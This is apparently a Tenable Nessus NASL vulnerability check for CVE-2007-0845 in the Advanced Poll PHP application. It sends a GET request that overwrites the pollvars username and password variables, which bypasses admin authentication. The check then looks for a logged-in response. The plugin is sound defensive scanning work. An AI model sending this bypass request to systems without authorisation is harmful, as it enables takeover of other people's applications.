#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24284);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-0845");
  script_bugtraq_id(22451);
  script_osvdb_id(35847);
  script_xref(name:"EDB-ID", value:"3282");

  script_name(english:"Advanced Poll admin/index.php Session Identifier Replay Authentication Bypass");
  script_summary(english:"Checks if variables can be overwritten with Advanced Poll");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a data
modification vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Advanced Poll, a simple polling application
written in PHP. 

The version of Advanced Poll installed on the remote host includes
code to emulate PHP's 'register_globals' functionality when that
setting is disabled, which is true by default with recent versions of
PHP.  In that case, an unauthenticated, remote attacker can leverage
this flaw to bypass authentication and gain control of the application
and possibly execute arbitrary code on the remote host, subject to the
permissions of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/02/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/02/08");
 script_cvs_date("$Date: 2016/05/19 17:45:32 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pollphp", "/poll", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to overwrite variables to bypass authentication and gain admin access.
  user = SCRIPT_NAME;
  pass = rand();

  r = http_send_recv3(method:"GET", port: port, 
    item:string(dir, "/admin/index.php?",
      "username=", user, "&",
      "pollvars[poll_username]=", user, "&",
      "password=", pass, "&",
      "pollvars[poll_password]=", hexstr(MD5(pass)) ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we are logged in.
  if (
    string(">", user, "@") >< res &&
    'a href="admin_logout.php?session=' >< res
  )
  {
    security_hole(port);
    exit(0);
  }
}
